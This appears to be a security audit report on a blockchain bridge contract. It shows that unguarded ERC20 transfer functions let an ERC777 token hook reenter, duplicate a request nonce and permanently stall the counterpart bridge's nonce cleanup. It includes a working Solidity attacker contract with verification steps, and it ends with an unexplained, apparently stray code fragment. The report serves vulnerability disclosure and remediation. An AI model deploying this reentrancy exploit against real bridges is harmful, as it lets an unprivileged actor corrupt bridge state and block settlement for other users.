### Title
Missing `nonReentrant` on `requestERC20Transfer` / `onERC20Received` Allows Duplicate `requestNonce` Emission, Permanently Corrupting Counterpart Bridge's `lowerHandleNonce` — (`File: contracts/service_chain/bridge/BridgeTransferERC20.sol`)

---

### Summary

`BridgeTransferKLAY._requestKLAYTransfer()` is protected with `nonReentrant`, and `BridgeFee._payKLAYFeeAndRefundChange()` even carries an explicit comment: *"Caller of this function must be nonReentrant."* The ERC20 counterparts — `requestERC20Transfer()`, `onERC20Received()`, and `_requestERC20Transfer()` — carry no such guard. `_requestERC20Transfer()` makes external ERC20 `safeTransfer` calls (inside `_payERC20FeeAndRefundChange`) **before** incrementing `requestNonce`. A registered ERC777-compatible token (or any token with a transfer hook) lets an unprivileged caller reenter the function with the same `requestNonce` value still in storage, emitting two `RequestValueTransfer` events sharing nonce N and skipping nonce N+1 entirely. This permanently stalls `lowerHandleNonce` on the counterpart bridge at N+1, breaking the nonce-cleanup loop and the `recoveryBlockNumber` tracking for all future blocks.

---

### Finding Description

**Asymmetric reentrancy protection across token types**

`BridgeTransferKLAY` inherits `ReentrancyGuard` and marks `_requestKLAYTransfer` with `nonReentrant`:

```
// BridgeTransferKLAY.sol line 103-106
function _requestKLAYTransfer(address _to, uint256 _feeLimit, bytes memory _extraData)
    internal
    unlockedKLAY
    nonReentrant          // ← guard present
```

`BridgeTransferERC20` does **not** inherit `ReentrancyGuard`. Neither `requestERC20Transfer` nor `onERC20Received` nor `_requestERC20Transfer` carries `nonReentrant`:

```
// BridgeTransferERC20.sol line 124-135
function requestERC20Transfer(...) public {          // ← no nonReentrant
    IERC20(_tokenAddress).safeTransferFrom(...);
    _requestERC20Transfer(...);
}

function onERC20Received(...) public {               // ← no nonReentrant
    _requestERC20Transfer(msg.sender, ...);
}
```

**Reentrancy path through `_payERC20FeeAndRefundChange`**

Inside `_requestERC20Transfer`, the first thing that happens is the fee/refund payment, which makes two external `safeTransfer` calls before `requestNonce` is ever incremented:

```
// BridgeFee.sol line 43-66
function _payERC20FeeAndRefundChange(address from, address _token, uint256 _feeLimit) internal {
    ...
    IERC20(_token).safeTransfer(feeReceiver, fee);       // external call 1
    ...
    IERC20(_token).safeTransfer(from, feeRefund);        // external call 2  ← hook fires on attacker
    ...
}
```

`safeTransfer(from, feeRefund)` sends tokens back to `from` (= `msg.sender` of `requestERC20Transfer`). For an ERC777 token, this triggers `tokensReceived` on `from`. At that moment `requestNonce` has **not** been incremented.

**Nonce duplication sequence**

```
Outer call: requestERC20Transfer(token, to, V, FL, data)
  safeTransferFrom(attacker → bridge, V+FL)          // tokens in
  _requestERC20Transfer(...)
    _payERC20FeeAndRefundChange(attacker, token, FL)
      safeTransfer(feeReceiver, fee)
      safeTransfer(attacker, feeRefund)              // ← tokensReceived fires
        Inner call: requestERC20Transfer(token, to, V, FL, data)
          safeTransferFrom(attacker → bridge, V+FL)  // more tokens in
          _requestERC20Transfer(...)
            _payERC20FeeAndRefundChange(...)
            emit RequestValueTransfer(..., nonce=N, ...)   // N emitted
            requestNonce++   // → N+1
      (hook returns)
    (fee payment returns)
    emit RequestValueTransfer(..., nonce=N, ...)           // N emitted AGAIN
    requestNonce++   // → N+2
```

Result: two `RequestValueTransfer` events with `requestNonce = N`; nonce N+1 is permanently skipped.

**Counterpart bridge state corruption**

The counterpart bridge operators call `handleERC20Transfer` for both events. The first call processes nonce N and `_updateHandleNonce(N)` advances `lowerHandleNonce` to N+1. The second call fails at `_lowerHandleNonceCheck(N)` (`require(N+1 <= N)`), so no double-spend occurs. However, nonce N+1 is never emitted on the source chain, so `handleNoncesToBlockNums[N+1]` is never set. The cleanup loop in `_updateHandleNonce` halts at N+1:

```
// BridgeTransfer.sol line 149-155
for (i = lowerHandleNonce; i <= limit && handleNoncesToBlockNums[i] > 0; i++) {
    recoveryBlockNumber = handleNoncesToBlockNums[i];
    delete handleNoncesToBlockNums[i];
    delete closedValueTransferVotes[i];
}
lowerHandleNonce = i;   // stuck at N+1 forever
```

`lowerHandleNonce` is permanently stuck at N+1. `recoveryBlockNumber` is frozen at the block of nonce N. All subsequent nonces (N+2, N+3, …) accumulate in `handleNoncesToBlockNums` and `closedValueTransferVotes` without ever being cleaned up. Repeated attacks compound the accumulation.

**`handleERC20Transfer` and `handleERC721Transfer` also lack `nonReentrant`**

Unlike `handleKLAYTransfer` (which has `nonReentrant` at line 73), `handleERC20Transfer` and `handleERC721Transfer` make external calls (`mint` / `safeTransfer` / `transferFrom`) after state updates without any reentrancy guard. While the nonce checks provide partial protection, the inconsistency is a direct analog to the Taiko bug and leaves the door open for future token-hook-based attacks.

---

### Impact Explanation

- `lowerHandleNonce` on the counterpart bridge is permanently stuck at the first skipped nonce, breaking the `_updateHandleNonce` cleanup loop for all future nonces.
- `recoveryBlockNumber` is frozen, corrupting the bridge's event-recovery mechanism.
- Repeated attacks cause unbounded accumulation of `handleNoncesToBlockNums` and `closedValueTransferVotes` entries, increasing gas costs for every subsequent `handleERC20Transfer` call.
- The attacker pays for two transfers per attack (tokens are not stolen), but a griefing actor can permanently degrade bridge liveness at the cost of their own tokens.

This matches the allowed impact: **persistent corruption of bridge state that breaks settlement** (`lowerHandleNonce` / `recoveryBlockNumber` corruption).

---

### Likelihood Explanation

- Requires a registered ERC777-compatible token (or any ERC20 with a `transfer` hook on the recipient). ERC777 is a live standard; bridges commonly register such tokens.
- The attacker must be an unprivileged user who holds enough of the registered token for two simultaneous transfers.
- No operator privilege is required; `requestERC20Transfer` and `onERC20Received` are fully public.
- The attack is deterministic and repeatable.

---

### Recommendation

1. Add `nonReentrant` to `requestERC20Transfer`, `onERC20Received`, `handleERC20Transfer`, and `handleERC721Transfer` in `BridgeTransferERC20.sol` and `BridgeTransferERC721.sol`, mirroring the guard already present on `_requestKLAYTransfer` and `handleKLAYTransfer`.
2. Move `requestNonce++` to **before** any external call in `_requestERC20Transfer` (checks-effects-interactions pattern).
3. Extend `BridgeTransferERC20` and `BridgeTransferERC721` to inherit `ReentrancyGuard`, as `BridgeTransferKLAY` already does.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.5.6;

// Attacker contract implementing ERC777 tokensReceived hook
contract ReentrancyAttacker {
    IBridge public bridge;
    IERC777Token public token;
    address public to;
    uint256 public value;
    uint256 public feeLimit;
    bool public reentered;

    constructor(address _bridge, address _token, address _to, uint256 _value, uint256 _feeLimit) public {
        bridge = IBridge(_bridge);
        token = IERC777Token(_token);
        to = _to;
        value = _value;
        feeLimit = _feeLimit;
    }

    // Entry point: approve bridge and call requestERC20Transfer
    function attack() external {
        token.approve(address(bridge), (value + feeLimit) * 2);
        bridge.requestERC20Transfer(address(token), to, value, feeLimit, "");
    }

    // ERC777 tokensReceived hook — fires when bridge refunds feeLimit back to this contract
    function tokensReceived(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter with same requestNonce still in storage
            bridge.requestERC20Transfer(address(token), to, value, feeLimit, "");
        }
    }
}

// After attack():
//   Source bridge emits RequestValueTransfer(nonce=N) twice
//   requestNonce = N+2  (N+1 skipped)
//   Counterpart bridge: lowerHandleNonce stuck at N+1 permanently
//   recoveryBlockNumber frozen at block of nonce N
```

**Verification steps:**
1. Deploy bridge with a registered ERC777 token and fee > 0.
2. Deploy `ReentrancyAttacker` with enough tokens for two transfers.
3. Call `attack()`.
4. Observe two `RequestValueTransfer` events with identical `requestNonce = 0` in the transaction receipt.
5. Observe `bridge.requestNonce() == 2` (skipping 1).
6. On the counterpart bridge, call `handleERC20Transfer` for both events; confirm the second reverts with "removed vote".

    function _payKLAYFeeAndRefundChange(uint256 _feeLimit) internal returns(uint256) {
        uint256 fee = feeOfKLAY;

        if (feeReceiver != address(0) && fee > 0) {
            require(_feeLimit >= fee, "insufficient feeLimit");

            (bool ok, ) = feeReceiver.call.value(fee)("");
            require(ok, "transfer fee failed");

            uint256 feeRefund = _feeLimit.sub(fee);
            if (feeRefund > 0) {
                (bool ok, ) = msg.sender.call.value(feeRefund)("");
                require(ok, "refund fee failed");
            }

            return fee;
        }

        if (_feeLimit > 0) {
            (bool ok, ) = msg.sender.call.value(_feeLimit)("");
            require(ok, "refund fee failed");
        }
        return 0;
    }
